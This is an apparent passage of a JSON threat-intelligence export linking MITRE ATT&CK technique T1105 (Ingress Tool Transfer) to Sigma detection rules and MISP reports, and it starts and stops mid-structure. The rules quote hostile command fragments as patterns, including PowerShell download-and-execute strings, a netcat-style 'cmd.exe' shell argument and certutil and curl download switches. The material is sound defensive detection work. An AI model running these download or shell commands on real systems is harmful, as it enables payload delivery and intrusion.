                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "74a12f18-505c-4114-8d0b-8448dd5485c6",
                    "e6919abc-99f9-4c6c-95a5-14761e7b2add",
                    "bb58aa4a-b80b-415a-a2c0-2f65a4c81009",
                    "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
                    "70ad0861-d1fe-491c-a45f-fa48148a300d",
                    "7a14080d-a048-4de8-ae58-604ce58a795b",
                    "e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97",
                    "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
                    "94771a71-ba41-4b6e-a757-b531372eaab6",
                    "e011a729-98a6-4139-b5c4-bf6f6dd8239a",
                    "3711eee4-a808-4849-8a14-faf733da3612",
                    "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "7cff77e1-9663-46a3-8260-17f2e1aa9d0a",
                    "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
                    "214641c2-c579-4ecb-8427-0cf19df6842e",
                    "8d7e392e-9b28-49e1-831d-5949c6281228",
                    "195c1119-ef07-4909-bb12-e66f5e07bf3c",
                    "eee00933-a761-4cd0-be70-c42fe91731e7",
                    "aac2fd97-bcba-491b-ad66-a6edf89c71bf",
                    "fc4f4817-0c53-4683-a4ee-b17a64bc1039",
                    "46123129-1024-423e-9fae-43af4a0fa9a5",
                    "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
                    "5d498330-f574-4889-bcc9-c53c950d210f",
                    "4480827a-9799-4232-b2c4-ccc6c4e9e12b",
                    "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc",
                    "cdecc44a-1dbf-4c1f-881c-f21e3f47272a",
                    "d7825193-b70a-48a4-b992-8b5b3015cc11",
                    "5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59",
                    "e218595b-bbe7-4ee5-8a96-f32a24ad3468",
                    "ea34fb97-e2c4-4afb-810f-785e4459b194",
                    "1ac8666b-046f-4201-8aba-1951aaec03a3",
                    "635dbb88-67b3-4b41-9ea5-a3af2dd88153",
                    "08249dc0-a28d-4555-8ba5-9255a198e08c",
                    "9292293b-8496-4715-9db6-37028dcda4b3",
                    "992a6cae-db6a-43c8-9cec-76d7195c96fc",
                    "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
                    "aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f",
                    "44143844-0631-49ab-97a0-96387d6b2d7c",
                    "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
                    "00bca14a-df4e-4649-9054-3f2aa676bc04",
                    "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
                    "af491bca-e752-4b44-9c86-df5680533dbc",
                    "0dba975d-a193-4ed1-a067-424df57570d1",
                    "bbeaed61-1990-4773-bf57-b81dbad7db2d",
                    "185d7418-f250-42d0-b72e-0c8b70661e93",
                    "aa8e035d-7be4-48d3-a944-102aec04400d",
                    "0c79148b-118e-472b-bdb7-9b57b444cc19",
                    "6f535e01-ca1f-40be-ab8d-45b19c0c8b7f",
                    "cafeeba3-01da-4ab4-b6c4-a31b1d9730c7",
                    "3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d",
                    "5e5709a4-8850-453e-9f11-275a0a0a020f",
                    "00b90cc1-17ec-402c-96ad-3a8117d7a582",
                    "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                    "47e0852a-cf81-4494-a8e6-31864f8c86ed",
                    "7b434893-c57d-4f41-908d-6a17bf1ae98f"
                ],
                "lookup_results": [
                    {
                        "uuid": "74a12f18-505c-4114-8d0b-8448dd5485c6",
                        "lookup_data": {
                            "description": "Detects the usage of nimgrab, a tool bundled with the Nim programming framework and used for downloading files.",
                            "raw": "author: frack113\ndate: 2022/08/28\ndescription: Detects the usage of nimgrab, a tool bundled with the Nim programming\n  framework and used for downloading files.\ndetection:\n  condition: 1 of selection_*\n  selection_hash:\n  - md5: 2DD44C3C29D667F5C0EF5F9D7C7FFB8B\n  - sha256: F266609E91985F0FE3E31C5E8FAEEEC4FFA5E0322D8B6F15FE69F4C5165B9559\n  - Imphash: C07FDDD21D123EA9B3A08EEF44AAAC45\n  selection_hashes:\n    Hashes|contains:\n    - MD5=2DD44C3C29D667F5C0EF5F9D7C7FFB8B\n    - SHA256=F266609E91985F0FE3E31C5E8FAEEEC4FFA5E0322D8B6F15FE69F4C5165B9559\n    - IMPHASH=C07FDDD21D123EA9B3A08EEF44AAAC45\n  selection_name:\n    Image|endswith: \\nimgrab.exe\nfalsepositives:\n- Legitimate use of Nim on developer systems\nid: 74a12f18-505c-4114-8d0b-8448dd5485c6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/01\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/28d190330fe44de6ff4767fc400cc10fa7cd6540/atomics/T1105/T1105.md\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: File Downloaded Using Nimgrab\n",
                            "sigma:id": "74a12f18-505c-4114-8d0b-8448dd5485c6",
                            "title": "File Downloaded Using Nimgrab",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e6919abc-99f9-4c6c-95a5-14761e7b2add",
                        "lookup_data": {
                            "mitre-attack-id": "T1105",
                            "mitre-cti:description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)",
                            "mitre-cti:name": "Ingress Tool Transfer",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['John Page (aka hyp3rlinx), ApparitionSec'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add', 'created': '2017-05-31T21:31:16.408Z', 'x_mitre_version': '2.1', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105'}, {'source_name': 'University of Birmingham C2', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.'}, {'source_name': 't1105_lolbas', 'url': 'https://lolbas-project.github.io/#t1105', 'description': 'LOLBAS. (n.d.). LOLBAS Mapped to T1105. Retrieved March 11, 2022.'}, {'source_name': 'PTSecurity Cobalt Dec 2016', 'url': 'https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf', 'description': 'Positive Technologies. (2016, December 16). Cobalt Snatch. Retrieved October 9, 2018.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \\n\\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\\n\\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)', 'modified': '2022-05-20T17:38:35.985Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Ingress Tool Transfer', 'x_mitre_detection': 'Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Network Traffic: Network Connection Creation', 'Network Traffic: Network Traffic Flow', 'File: File Creation', 'Network Traffic: Network Traffic Content'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bb58aa4a-b80b-415a-a2c0-2f65a4c81009",
                        "lookup_data": {
                            "description": "Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/03\ndescription: Detects a suspicious Microsoft desktopimgdownldr execution with parameters\n  used to download files from the Internet\ndetection:\n  condition: ( selection1 and not selection1_filter ) or selection_reg\n  selection1:\n    CommandLine|contains: ' /lockscreenurl:'\n  selection1_filter:\n    CommandLine|contains:\n    - .jpg\n    - .jpeg\n    - .png\n  selection_reg:\n    CommandLine|contains|all:\n    - reg delete\n    - \\PersonalizationCSP\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nfields:\n- CommandLine\n- ParentCommandLine\nid: bb58aa4a-b80b-415a-a2c0-2f65a4c81009\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n- https://twitter.com/SBousseaden/status/1278977301745741825\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Desktopimgdownldr Command\n",
                            "sigma:id": "bb58aa4a-b80b-415a-a2c0-2f65a4c81009",
                            "title": "Suspicious Desktopimgdownldr Command",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
                        "lookup_data": {
                            "description": "Detects a suspicious copy command to or from an Admin share or remote",
                            "raw": "author: Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT,\n  Zach Stanford @svch0st, Nasreddine Bencherchali\ndate: 2019/12/30\ndescription: Detects a suspicious copy command to or from an Admin share or remote\ndetection:\n  condition: target and (selection_other_tools or all of selection_cmd_* or all of\n    selection_pwsh_*)\n  selection_cmd_cli:\n    CommandLine|contains: copy\n  selection_cmd_img:\n  - Image|endswith: \\cmd.exe\n  - OriginalFileName: Cmd.Exe\n  selection_other_tools:\n  - Image|endswith:\n    - \\robocopy.exe\n    - \\xcopy.exe\n  - OriginalFileName:\n    - robocopy.exe\n    - XCOPY.EXE\n  selection_pwsh_cli:\n    CommandLine|contains:\n    - copy-item\n    - 'copy '\n    - 'cpi '\n    - ' cp '\n    - 'move '\n    - move-item\n    - ' mi '\n    - ' mv '\n  selection_pwsh_img:\n  - Image|contains:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  target:\n    CommandLine|contains|all:\n    - \\\\\\\\\n    - $\nfalsepositives:\n- Administrative scripts\nfields:\n- CommandLine\n- ParentCommandLine\nid: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/31\nreferences:\n- https://twitter.com/SBousseaden/status/1211636381086339073\n- https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view\n- https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html\n- https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.collection\n- attack.exfiltration\n- attack.t1039\n- attack.t1048\n- attack.t1021.002\ntitle: Copy from Admin Share\n",
                            "sigma:id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
                            "title": "Copy from Admin Share",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "70ad0861-d1fe-491c-a45f-fa48148a300d",
                        "lookup_data": {
                            "description": "Detects when a user downloads file by using CertOC.exe",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/05/16\ndescription: Detects when a user downloads file by using CertOC.exe\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains: -GetCACAPS\n  selection_img:\n  - Image|endswith: \\certoc.exe\n  - OriginalFileName: CertOC.exe\nfalsepositives:\n- Unknown\nid: 70ad0861-d1fe-491c-a45f-fa48148a300d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious File Download via CertOC.exe\n",
                            "sigma:id": "70ad0861-d1fe-491c-a45f-fa48148a300d",
                            "title": "Suspicious File Download via CertOC.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7a14080d-a048-4de8-ae58-604ce58a795b",
                        "lookup_data": {
                            "description": "Detects the use of tools that copy files from or to remote systems",
                            "raw": "author: \"\\xD6mer G\\xFCnal\"\ndate: 2020/06/18\ndescription: Detects the use of tools that copy files from or to remote systems\ndetection:\n  condition: tools and filter\n  filter:\n  - '@'\n  - ':'\n  tools:\n  - 'scp '\n  - 'rsync '\n  - 'sftp '\nfalsepositives:\n- Legitimate administration activities\nid: 7a14080d-a048-4de8-ae58-604ce58a795b\nlevel: low\nlogsource:\n  product: linux\nreferences:\n- https://attack.mitre.org/techniques/T1105/\nstatus: stable\ntags:\n- attack.command_and_control\n- attack.lateral_movement\n- attack.t1105\ntitle: Remote File Copy\n",
                            "sigma:id": "7a14080d-a048-4de8-ae58-604ce58a795b",
                            "title": "Remote File Copy",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97",
                        "lookup_data": {
                            "description": "Detects an executable in the Windows folder accessing suspicious domains",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/08/30\ndescription: Detects an executable in the Windows folder accessing suspicious domains\ndetection:\n  condition: selection\n  selection:\n    DestinationHostname|endswith:\n    - dl.dropboxusercontent.com\n    - .pastebin.com\n    - .githubusercontent.com\n    - cdn.discordapp.com/attachments/\n    - mediafire.com\n    - mega.nz\n    - ddns.net\n    - .paste.ee\n    - .hastebin.com/raw/\n    - .ghostbin.co/\n    - ufile.io\n    - anonfiles.com\n    - send.exploit.in\n    - transfer.sh\n    - privatlab.net\n    - privatlab.com\n    - sendspace.com\n    - pastetext.net\n    - pastebin.pl\n    - paste.ee\n    Image|startswith:\n    - C:\\Windows\\\n    - C:\\Users\\Public\\\n    Initiated: 'true'\nfalsepositives:\n- Unknown\nid: e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://twitter.com/M_haggis/status/900741347035889665\n- https://twitter.com/M_haggis/status/1032799638213066752\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker\n- https://www.cisa.gov/uscert/ncas/alerts/aa22-321a\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1105\ntitle: Microsoft Binary Suspicious Communication Endpoint\n",
                            "sigma:id": "e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97",
                            "title": "Microsoft Binary Suspicious Communication Endpoint",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
                        "lookup_data": {
                            "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
                            "raw": "author: Sreeman, Nasreddine Bencherchali\ndate: 2020/01/13\ndescription: Adversaries can use curl to download payloads remotely and execute them.\n  Curl is included by default in Windows 10 build 17063 and later.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' /c '\n    - 'curl '\n    - http\n    - -o\n    - '&'\nfalsepositives:\n- Administrative scripts (installers)\nfields:\n- ParentImage\n- CommandLine\nid: 21dd6d38-2b18-4453-9404-a0fe4a0cc288\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/02\nreferences:\n- https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983\nstatus: test\ntags:\n- attack.execution\n- attack.t1218\n- attack.command_and_control\n- attack.t1105\ntitle: Curl Start Combination\n",
                            "sigma:id": "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
                            "title": "Curl Start Combination",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "94771a71-ba41-4b6e-a757-b531372eaab6",
                        "lookup_data": {
                            "description": "Detects the suspicious minimized start of MsEdge browser, which can be used to download files from the Internet",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects the suspicious minimized start of MsEdge browser, which can be\n  used to download files from the Internet\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: start /min msedge\nfalsepositives:\n- Software that uses MsEdge to download components in the background (see ParentImage,\n  ParentCommandLine)\nfields:\n- CommandLine\n- ParentCommandLine\nid: 94771a71-ba41-4b6e-a757-b531372eaab6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/mrd0x/status/1478234484881436672?s=12\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Minimized MSEdge Start\n",
                            "sigma:id": "94771a71-ba41-4b6e-a757-b531372eaab6",
                            "title": "Suspicious Minimized MSEdge Start",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e011a729-98a6-4139-b5c4-bf6f6dd8239a",
                        "lookup_data": {
                            "description": "Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code",
                            "raw": "author: Florian Roth (Nextron Systems), juju4, keepwatch\ndate: 2019/01/16\ndescription: Detects a suspicious Microsoft certutil execution with sub commands like\n  'decode' sub command, which is sometimes used to decode malicious code\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' -decode '\n    - ' -decodehex '\n    - ' -urlcache '\n    - ' -verifyctl '\n    - ' -encode '\n    - ' -exportPFX '\n    - ' /decode '\n    - ' /decodehex '\n    - ' /urlcache '\n    - ' /verifyctl '\n    - ' /encode '\n    - ' /exportPFX '\n  selection_img:\n  - Image|endswith: \\certutil.exe\n  - OriginalFileName: CertUtil.exe\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nfields:\n- CommandLine\n- ParentCommandLine\nid: e011a729-98a6-4139-b5c4-bf6f6dd8239a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/12\nreferences:\n- https://twitter.com/JohnLaTwC/status/835149808817991680\n- https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/\n- https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/\n- https://twitter.com/egre55/status/1087685529016193025\n- https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1140\n- attack.command_and_control\n- attack.t1105\n- attack.s0160\n- attack.g0007\n- attack.g0010\n- attack.g0045\n- attack.g0049\n- attack.g0075\n- attack.g0096\ntitle: Suspicious Certutil Command Usage\n",
                            "sigma:id": "e011a729-98a6-4139-b5c4-bf6f6dd8239a",
                            "title": "Suspicious Certutil Command Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3711eee4-a808-4849-8a14-faf733da3612",
                        "lookup_data": {
                            "description": "Detects tools and process executions as observed in a Greenbug campaign in May 2020",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/05/20\ndescription: Detects tools and process executions as observed in a Greenbug campaign\n  in May 2020\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains|all:\n    - bitsadmin\n    - /transfer\n    - CSIDL_APPDATA\n  selection2:\n    CommandLine|contains: CSIDL_SYSTEM_DRIVE\n  selection3:\n    CommandLine|contains:\n    - \\msf.ps1\n    - 8989 -e cmd.exe\n    - system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill\n    - -nop -w hidden -c $k=new-object\n    - '[Net.CredentialCache]::DefaultCredentials;IEX '\n    - ' -nop -w hidden -c $m=new-object net.webclient;$m'\n    - -noninteractive -executionpolicy bypass whoami\n    - -noninteractive -executionpolicy bypass netstat -a\n    - L3NlcnZlcj1\n  selection4:\n    Image|endswith:\n    - \\adobe\\Adobe.exe\n    - \\oracle\\local.exe\n    - \\revshell.exe\n    - infopagesbackup\\ncat.exe\n    - CSIDL_SYSTEM\\cmd.exe\n    - \\programdata\\oracle\\java.exe\n    - CSIDL_COMMON_APPDATA\\comms\\comms.exe\n    - \\Programdata\\VMware\\Vmware.exe\nfalsepositives:\n- Unknown\nid: 3711eee4-a808-4849-8a14-faf733da3612\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/21\nreferences:\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia\nstatus: test\ntags:\n- attack.g0049\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1105\n- attack.defense_evasion\n- attack.t1036.005\ntitle: Greenbug Campaign Indicators\n",
                            "sigma:id": "3711eee4-a808-4849-8a14-faf733da3612",
                            "title": "Greenbug Campaign Indicators",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                        "lookup_data": {
                            "description": "Trickbot to Ryuk in Two Hours",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e78dc2c-afc8-411f-94a5-40bb950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1585237597",
                            "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7cff77e1-9663-46a3-8260-17f2e1aa9d0a",
                        "lookup_data": {
                            "description": "AppInstaller.exe is spawned by the default handler for the \"ms-appinstaller\" URI. It attempts to load/install a package from the referenced URL",
                            "raw": "author: frack113\ndate: 2021/11/24\ndescription: AppInstaller.exe is spawned by the default handler for the \"ms-appinstaller\"\n  URI. It attempts to load/install a package from the referenced URL\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\AppInstaller.exe\n    Image|startswith: C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_\nfalsepositives:\n- Unknown\nid: 7cff77e1-9663-46a3-8260-17f2e1aa9d0a\nlevel: medium\nlogsource:\n  category: dns_query\n  product: windows\nmodified: 2023/01/12\nreferences:\n- https://twitter.com/notwhickey/status/1333900137232523264\n- https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: AppX Package Installation Attempts Via AppInstaller\n",
                            "sigma:id": "7cff77e1-9663-46a3-8260-17f2e1aa9d0a",
                            "title": "AppX Package Installation Attempts Via AppInstaller",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
                        "lookup_data": {
                            "description": "Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism",
                            "raw": "author: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali\ndate: 2020/10/05\ndescription: Attackers can use findstr to hide their artifacts or search specific\n  strings and evade defense mechanism\ndetection:\n  condition: selection_findstr and (all of selection_cli_download* or all of selection_cli_creds*)\n  selection_cli_creds_1:\n    CommandLine|contains:\n    - ' /s '\n    - ' -s '\n  selection_cli_creds_2:\n    CommandLine|contains:\n    - ' /i '\n    - ' -i '\n  selection_cli_download_1:\n    CommandLine|contains:\n    - ' /v '\n    - ' -v '\n  selection_cli_download_2:\n    CommandLine|contains:\n    - ' /l '\n    - ' -l '\n  selection_findstr:\n  - CommandLine|contains: findstr\n  - Image|endswith: findstr.exe\n  - OriginalFileName: FINDSTR.EXE\nfalsepositives:\n- Administrative findstr usage\nid: bf6c39fc-e203-45b9-9538-05397c1b4f3f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/11\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n- https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1564.004\n- attack.t1552.001\n- attack.t1105\ntitle: Abusing Findstr for Defense Evasion\n",
                            "sigma:id": "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
                            "title": "Abusing Findstr for Defense Evasion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "214641c2-c579-4ecb-8427-0cf19df6842e",
                        "lookup_data": {
                            "description": "Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.",
                            "raw": "author: Tim Rauch\ndate: 2022/09/27\ndescription: Detects the desktopimgdownldr utility being used to download a remote\n  file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative\n  to certutil.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: /lockscreenurl:http\n    Image|endswith: \\desktopimgdownldr.exe\n    ParentImage|endswith: \\desktopimgdownldr.exe\nfalsepositives:\n- Unknown\nid: 214641c2-c579-4ecb-8427-0cf19df6842e\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.elastic.co/guide/en/security/current/remote-file-download-via-desktopimgdownldr-utility.html\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Remote File Download via Desktopimgdownldr Utility\n",
                            "sigma:id": "214641c2-c579-4ecb-8427-0cf19df6842e",
                            "title": "Remote File Download via Desktopimgdownldr Utility",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8d7e392e-9b28-49e1-831d-5949c6281228",
                        "lookup_data": {
                            "description": "Use IMEWDBLD.exe (built-in to windows) to download a file",
                            "raw": "author: frack113\ndate: 2022/01/22\ndescription: Use IMEWDBLD.exe (built-in to windows) to download a file\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\IMEWDBLD.exe\n    Initiated: 'true'\nfalsepositives:\n- Legitimate script\nid: 8d7e392e-9b28-49e1-831d-5949c6281228\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download\n- https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Download a File with IMEWDBLD.exe\n",
                            "sigma:id": "8d7e392e-9b28-49e1-831d-5949c6281228",
                            "title": "Download a File with IMEWDBLD.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "195c1119-ef07-4909-bb12-e66f5e07bf3c",
                        "lookup_data": {
                            "description": "Detects download of certain file types from hosts with dynamic DNS names (selected list)",
